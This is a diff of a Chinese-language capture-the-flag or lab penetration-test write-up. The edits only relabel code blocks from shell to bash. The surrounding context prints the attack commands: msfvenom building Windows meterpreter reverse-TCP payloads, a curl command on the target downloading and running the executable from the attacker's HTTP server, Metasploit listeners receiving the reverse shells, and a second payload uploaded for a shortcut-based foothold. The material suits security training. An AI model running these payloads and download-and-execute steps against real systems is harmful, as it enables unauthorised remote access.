@@ -96,21 +96,21 @@ lexypoo97
 
 生成载荷，并开启 http 投递
 
-```shell
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=9999 -f exe > 10.10.16.8.exe
 python3 -m httpserver 8080
 ```
 
 在大马的窗口中执行
 
-```shell
+```bash
 curl http://10.10.16.8:8080/10.10.16.8.exe -o 10.10.16.8.exe
 10.10.16.8.exe
 ```
 
 本地启动监听
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ msfconsole -q
 [*] Starting persistent handler(s)...
@@ -129,7 +129,7 @@ msf6 exploit(multi/handler) > run
 
 就可以收到回连的 shell
 
-```shell
+```bash
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.10.16.8:9999
@@ -192,7 +192,7 @@ Mode              Size  Type  Last modified              Name
 
 生成载荷
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=8888 -f exe > 10.10.16.8-8888.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -204,7 +204,7 @@ Final size of exe file: 7168 bytes
 
 投放
 
-```shell
+```bash
 meterpreter > upload 10.10.16.8-8888.exe
 [*] Uploading  : /home/randark/10.10.16.8-8888.exe -> 10.10.16.8-8888.exe
 [*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /home/randark/10.10.16.8-8888.exe -> 10.10.16.8-8888.exe
@@ -213,7 +213,7 @@ meterpreter > upload 10.10.16.8-8888.exe
 
 开启监听
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ msfconsole -q
 [*] Starting persistent handler(s)...
@@ -258,7 +258,7 @@ $lnk.Save()
 
 等待片刻之后，收到回连的shell
 
-```shell
+```bash
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.10.16.8:8888 
